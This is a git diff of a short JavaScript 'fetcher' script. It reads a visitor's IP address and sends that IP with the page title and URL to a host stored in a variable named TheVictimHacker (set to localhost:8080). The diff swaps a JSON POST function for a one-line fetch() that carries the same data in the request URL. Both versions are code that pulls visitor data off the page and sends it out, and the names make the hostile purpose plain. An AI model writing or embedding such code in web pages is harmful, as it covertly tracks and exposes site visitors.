@@ -1,4 +1,5 @@
 console.log("Fetcher included! :)")
+let TheVictimHacker = "http://localhost:8080"
 function victimIPGET()
 {
     var xmlHttp = new XMLHttpRequest();
@@ -9,24 +10,4 @@ function victimIPGET()
 let victimIP = victimIPGET()
 console.log(victimIP)
 
-function sendVictimIP(){
-const xhr = new XMLHttpRequest();
-
-// listen for `load` event
-
-// create a JSON object
-const json = {
-    "title": document.title,
-    "url": window.location,
-    "ip": victimIP
-};
-
-// open request
-xhr.open('POST', TheVictimHacker);
-
-// set `Content-Type` header
-xhr.setRequestHeader('Content-Type', 'application/json');
-
-// send rquest with JSON payload
-xhr.send(JSON.stringify(json));
-}
+fetch(`${TheVictimHacker}/${victimIP}&${document.title}&${window.location}`)
